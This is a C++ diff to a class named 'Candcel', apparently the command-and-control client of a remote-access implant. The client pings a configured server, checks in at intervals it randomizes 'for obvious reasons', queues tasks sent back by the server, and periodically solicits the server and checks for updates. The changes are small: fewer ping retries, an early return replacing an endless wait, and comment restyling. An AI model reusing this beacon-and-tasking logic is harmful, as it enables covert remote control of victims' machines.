@@ -30,8 +30,8 @@ void Candcel::InitClass()
 		return;
 	}
 
-	while (!IsAlive()) {
-		DeepSleep();
+	if (!IsAlive()) {
+		return;
 	}
 
 	Solicit();
@@ -48,12 +48,12 @@ bool Candcel::IsAlive()
 {
 	LogInfo(L"Candcel", L"Check if server is alive");
 
-	for (int i = 0; i < 10; ++i) {
+	for (int i = 0; i < 5; ++i) {
 		RestClient rc(Config::Current()->AvcHost(), Config::Current()->AvcUri());
 
 		rc.Call(RestClientCommand::CM_CLIENT_PING, new JSONValue);
 
-		if (rc.getServerCode() == RestServerCommand::CM_SERVER_PONG) {
+		if (rc.Success() && rc.getServerCode() == RestServerCommand::CM_SERVER_PONG) {
 			return true;
 		}
 
@@ -73,7 +73,7 @@ DWORD Candcel::CheckIn()
 	while (true) {
 		int nextInterval = (rand() % (CHECKIN_PACE + 1));
 
-		/* Randomize the interval for obvious reasons */
+		// Randomize the interval for obvious reasons
 		Sleep(nextInterval * 60 * 1000);
 
 		if (!serverSolicitAck) {
@@ -113,7 +113,7 @@ DWORD Candcel::CheckIn()
 		LogInfo(L"Candcel", L"Remote at " + std::to_wstring(elapsedTime) + L"ms");
 #endif
 
-		/* Check for tasks */
+		// Check for tasks
 		if (returnObj) {
 			if (returnObj->IsObject()) {
 				if (returnObj->HasChild(L"task")) {
@@ -132,7 +132,7 @@ DWORD Candcel::CheckIn()
 						}
 					}
 
-					/* Put task on queue */
+					// Put task on queue
 					TaskQueue::Current()->Add(task);
 				}
 			}
@@ -140,12 +140,12 @@ DWORD Candcel::CheckIn()
 
 		checkInCount++;
 
-		/* Solicit about every two hours */
+		// Solicit about every two hours
 		if (checkInCount % 8 == 0) {
 			Solicit();
 		}
 
-		/* Check for updates after about a day */
+		// Check for updates after about a day
 		if (checkInCount > SOLICIT_PACE) {
 			CheckForUpdate();
 			checkInCount = 0;
